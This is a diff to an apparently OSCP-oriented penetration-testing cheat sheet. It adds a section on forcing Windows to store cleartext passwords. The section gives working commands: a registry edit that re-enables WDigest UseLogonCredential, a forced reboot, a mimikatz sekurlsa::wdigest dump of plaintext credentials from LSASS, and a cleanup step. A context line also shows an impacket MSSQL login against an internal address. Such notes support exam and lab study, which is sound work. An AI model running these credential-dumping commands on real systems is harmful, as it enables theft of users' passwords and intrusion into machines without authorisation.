@@ -59,3 +59,22 @@ impacket-mssqlclient
 impacket-mssqlclient {{DOMAIN_NB}}/DAMUNDSEN@172.16.5.150 -windows-auth
 ```
 
+## WDigest downgrade (force cleartext creds into LSASS)
+
+> Needs **local admin / SYSTEM**. Since Win8.1/2012R2 WDigest no longer caches plaintext in memory; `UseLogonCredential=1` re-enables it, so future logons leave **cleartext** passwords for mimikatz. Only affects **new** logons → reboot or wait for a privileged user. Noisy/slow — on OSCP the NT hash from a normal dump is usually enough, so use this only when you specifically need the plaintext. Set back to `0` to clean up.
+
+```cmd
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1
+shutdown.exe /r /t 0 /f
+```
+
+```powershell
+# after a privileged logon, read the cleartext from memory
+.\mimikatz.exe "privilege::debug" "sekurlsa::wdigest" "exit"
+```
+
+```cmd
+:: cleanup — restore the default
+reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0
+```
+
